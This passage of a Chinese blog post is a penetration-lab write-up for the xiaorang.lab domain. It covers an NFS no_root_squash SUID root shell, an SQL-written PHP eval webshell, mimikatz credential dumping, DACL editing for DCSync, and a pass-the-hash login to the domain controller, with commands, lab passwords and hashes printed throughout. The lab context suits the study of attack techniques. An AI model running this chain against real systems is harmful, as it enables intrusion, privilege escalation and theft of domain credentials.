http://172.22.13.14:8080  code:200 len:3655   title:公司发货单</span></span><br><span class="line"><span class="string">[*] NetInfo:</span></span><br><span class="line"><span class="string">[*]172.22.13.6</span></span><br><span class="line"><span class="string">   [-&gt;]WIN-DC</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.13.6</span></span><br><span class="line"><span class="string">[*] NetInfo:</span></span><br><span class="line"><span class="string">[*]172.22.13.28</span></span><br><span class="line"><span class="string">   [-&gt;]WIN-HAUWOLAO</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.13.28</span></span><br><span class="line"><span class="string">[*] NetBios: 172.22.13.6     [+]DC XIAORANG\WIN-DC          </span></span><br><span class="line"><span class="string">[*] WebTitle: http://172.22.13.57       code:200 len:4833   title:Welcome to CentOS</span></span><br><span class="line"><span class="string">[*] WebTitle: http://172.22.13.28       code:200 len:2525   title:欢迎登录OA办公平台</span></span><br><span class="line"><span class="string">[+] ftp://172.22.13.14:21:anonymous </span></span><br><span class="line"><span class="string">   [-&gt;]1.txt</span></span><br><span class="line"><span class="string">   [-&gt;]pom.xml</span></span><br><span class="line"><span class="string">[*] NetBios: 172.22.13.28    WIN-HAUWOLAO.xiaorang.lab           Windows Server 2016 Datacenter 14393 </span></span><br><span class="line"><span class="string">[*] WebTitle: http://172.22.13.28:8000  code:200 len:170    title:Nothing Here.</span></span><br><span class="line"><span class="string">[+] mysql:172.22.13.28:3306:root 123456</span></span><br><span class="line"><span class="string">已完成 16/16</span></span><br></pre></td></tr></table></figure>
+
+<p>梳理如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.13.28 WIN-HAUWOLAO.xiaorang.lab  数据中心 有弱口令 有OA系统</span><br><span class="line">172.22.13.6 域控</span><br><span class="line">172.22.13.57 域内主机</span><br><span class="line">172.22.13.14 本机</span><br></pre></td></tr></table></figure>
+
+<p>上传frp搭建内网穿透</p>
+<p>先看oa系统</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261105009.png" alt="image-20231026110530922" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026110530922</span></div></div>
+
+<p>貌似就是个页面，也登录不了</p>
+<p>数据库里也没啥东西</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261110790.png" alt="image-20231026111041753" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026111041753</span></div></div>
+
+<p>还是先去看<code>172.22.13.57</code>吧，根据题目描述是打NFS的漏洞，查看发现确实开启了2049端口</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261120866.png" alt="image-20231026112005816" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026112005816</span></div></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q showmount -e 172.22.13.57 </span><br><span class="line">Export list <span class="keyword">for</span> 172.22.13.57:</span><br><span class="line">/home/joyce *</span><br></pre></td></tr></table></figure>
+
+<p>发现可以挂载<code>/home/joyce</code>目录</p>
+<p>在172.22.13.14这个机器上进行挂载，需要先安装nfs-common软件包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install nfs-common</span><br></pre></td></tr></table></figure>
+
+<p>创建一个目录，然后挂载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 172.22.13.57:/home /tmp/mount</span><br></pre></td></tr></table></figure>
+
+<p>成功挂载</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261407103.png" alt="image-20231026140754043" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026140754043</span></div></div>
+
+<p>使用<code>ls -a</code>查看文件</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261422331.png" alt="image-20231026142227293" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026142227293</span></div></div>
+
+<p>测试发现我对joyce目录有写权限，所以可以通过上传ssh公钥来进行ssh连接</p>
+<p>先本地创建一个joyce用户，并根据挂载的joyce目录的uid和gid来设置本地joyce的uid和gid</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261457706.png" alt="image-20231026145739675" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026145739675</span></div></div>
+
+<p>需要设置为996和994</p>
+<p>创建组和用户joyce</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">groupadd -g 994 joyce</span><br><span class="line">useradd -uid 996 -gid 994 joyce</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261513023.png" alt="image-20231026151302982" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026151302982</span></div></div>
+
+<p>然后切换到joyce用户，生成公钥并将其复制到挂载目录下joyce的.ssh文件夹下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su joyce</span><br><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261514559.png" alt="image-20231026151453515" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026151453515</span></div></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/joyce/.ssh/id_rsa.pub &gt;&gt; /tmp/mount/joyce/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>并赋予权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 700 /tmp/mount/joyce/.ssh</span><br><span class="line"><span class="built_in">chmod</span> 600 /tmp/mount/joyce/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>然后在joyce用户下直接ssh连接，要先用pty设置terminal，否则无法ssh连接</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261518205.png" alt="image-20231026151830178" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026151830178</span></div></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">ssh joyce@172.22.13.57</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261519569.png" alt="image-20231026151909531" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026151909531</span></div></div>
+
+<p>成功登录172.22.13.57主机</p>
+<h2 id="no-root-squash编译高权限shell"><a href="#no-root-squash编译高权限shell" class="headerlink" title="no_root_squash编译高权限shell"></a>no_root_squash编译高权限shell</h2><p>查看<code>/etc/exports</code>，可以发现共享卷的参数存在不安全参数<code>no_root_squash</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261529456.png" alt="image-20231026152941424" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026152941424</span></div></div>
+
+<blockquote>
+<p><code>root_squash</code>和<code>no_root_squash</code>是NFS（Network File System）服务器上的两个选项，用于控制对共享文件系统中root用户的访问权限。</p>
+<ul>
+<li><code>root_squash</code>：当客户端以root用户身份连接到NFS服务器时，该选项将把root用户的权限映射为匿名用户（通常是nobody或nfsnobody），从而限制其对共享文件系统的访问权限。这样可以提高系统的安全性，防止恶意root用户对共享文件系统进行未经授权的访问或修改。</li>
+<li><code>no_root_squash</code>：与<code>root_squash</code>相反，当客户端以root用户身份连接到NFS服务器时，该选项将保留root用户的权限，允许其对共享文件系统拥有完全的访问权限。这样可以提供更高的灵活性，但也会增加系统的安全风险，因为root用户可能会对共享文件系统进行未经授权的访问或修改。</li>
+</ul>
+</blockquote>
+<p>所以可以用来创建suid位的可执行文件</p>
+<p>将以下内容的文件放到vps上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123; setuid(<span class="number">0</span>); system(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后回到之前的那台有root权限的主机上，将此文件下载下来放到挂载的目录下</p>
+<p>编译，然后设置suid，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://vps:9020/s.c</span><br><span class="line">gcc s.c -o shell</span><br><span class="line"><span class="built_in">chmod</span>  +s shell</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261554290.png" alt="image-20231026155401253" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026155401253</span></div></div>
+
+<p>然后su到joyce用户再ssh连接172.22.13.57主机，执行shell文件，即可获得root权限</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261554974.png" alt="image-20231026155457935" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026155457935</span></div></div>
+
+<p>获得flag02: flag{7ac9f23a-34b2-48c3-88fb-d9433df8d44e} 还有一个hint：<code>hint: relay race </code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261555175.png" alt="image-20231026155520141" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026155520141</span></div></div>
+
+<h2 id="phpstudy高权限写日志马"><a href="#phpstudy高权限写日志马" class="headerlink" title="phpstudy高权限写日志马"></a>phpstudy高权限写日志马</h2><p>在根目录下的<code>pAss.txt</code>文件获得一个凭据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab/zhangwen\QT62f3gBhK1</span><br></pre></td></tr></table></figure>
+
+<p>尝试利用这个凭据去登录<code>WIN-HAUWOLAO.xiaorang.la</code>主机</p>
+<p>而且开启了3389端口</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261600210.png" alt="image-20231026160000167" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026160000167</span></div></div>
+
+<p>使用这个凭据成功登录172.22.13.28主机</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261605762.png" alt="image-20231026160559681" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026160559681</span></div></div>
+
+<p>OA系统网站果然只有一个index.html</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261616568.png" alt="image-20231026161641490" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026161641490</span></div></div>
+
+<p>这里需要提权，知道secure_file_priv的值不为null。所以尝试利用mysql进行udf提权，</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261624776.png" alt="image-20231026162454720" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026162454720</span></div></div>
+
+<p>但是写udf失败了，失败之后就得重启靶机了，艹</p>
+<p>还有phpstudy，当网站是用phpstudy搭建的时候，php命令的执行权限通常为管理员用户或者是 SYSTEM 权限，通过日志写马的方式就可以获得高权限的webshell</p>
+<p>所以通过mysql写日志的方式来写webshell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[1]);?&gt;&quot; <span class="keyword">into</span> OUTFILE &quot;C:\\phpstudy_pro\\WWW\\shell.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后蚁剑连接，要给蚁剑设置socket代理</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261807625.png" alt="image-20231026180747528" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026180747528</span></div></div>
+
+<p>到的flag03: flag{a2752cf5-9ffc-47b3-a74e-83c9c80831aa} </p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261808939.png" alt="image-20231026180817876" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026180817876</span></div></div>
+
+<h2 id="修改DACL进行DCSync"><a href="#修改DACL进行DCSync" class="headerlink" title="修改DACL进行DCSync"></a>修改DACL进行DCSync</h2><p>用Sharphound和三头狗来分析域信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sharphound.exe --CollectionMethods ALL --Domain XIAORANG.LAB</span><br></pre></td></tr></table></figure>
+
+<p>可以看到CHENGLEI在WIN-HAUWOLAO主机上登录过，而他又是属于ACL ADMIN组</p>
+<p>他这里的ACL ADMIN组对域内用户拥有WriteDACL权限，就可以修改普通用户让普通用户获得DCSync的权限，来获取域管理员的凭据</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261831389.png" alt="image-20231026183125340" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026183125340</span></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261836024.png" alt="image-20231026183636975" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026183636975</span></div></div>
+
+<p>用mimikatz抓取凭据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<p>抓到chenglei的凭据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kerberos :    </span><br><span class="line">* Username : chenglei</span><br><span class="line">* Domain   : XIAORANG.LAB</span><br><span class="line">* Password : Xt61f3LBhg1</span><br><span class="line"></span><br><span class="line">* Username : chenglei</span><br><span class="line">* Domain   : XIAORANG</span><br><span class="line">* NTLM     : 0c00801c30594a1b8eaa889d237c5382</span><br><span class="line">* SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7</span><br><span class="line">* DPAPI    : 89b179dc738db098372c365602b7b0f4</span><br></pre></td></tr></table></figure>
+
+<p>用这个凭据去修改他自己的acl，让其拥有DCSync权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 dacledit.py xiaorang.lab/chenglei -hashes :0c00801c30594a1b8eaa889d237c5382 -action write -rights DCSync -principal chenglei -target-dn <span class="string">&#x27;DC=xiaorang,DC=lab&#x27;</span> -dc-ip 172.22.13.6</span><br></pre></td></tr></table></figure>
+
+<p>利用DCSync导出域控的凭据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 secretsdump.py  xiaorang.lab/chenglei@172.22.13.6 -hashes :0c00801c30594a1b8eaa889d237c5382  -just-dc-user administrator </span><br></pre></td></tr></table></figure>
+
+<p>得到域管hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:6341235defdaed66fb7b682665752c9a:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:d0f9c9b1bea5b90f9547952d2009bda6e1aab23ff2862bf9afb2be793709f0cd</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:afeaadd6987386ed1e8938fb9e167e6c</span><br><span class="line">Administrator:des-cbc-md5:cb584c08e308a4ae</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>
+
+<p>登录之</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:6341235defdaed66fb7b682665752c9a administrator@172.22.13.6</span><br></pre></td></tr></table></figure>
+
+<p>得到flag04: flag{8065fe0f-e6ac-4826-929e-3294184ac1e8}</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261853537.png" alt="image-20231026185348491" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026185348491</span></div></div>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>许可协议</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/10/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Flarum/">春秋云镜Flarum-wp</a></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md-text reveal' id="comments">
+    <section class='header cmt-title cap theme'>
+      快来参与讨论吧
+    </section>
+    <section class='body cmt-body giscus'>
+      
+
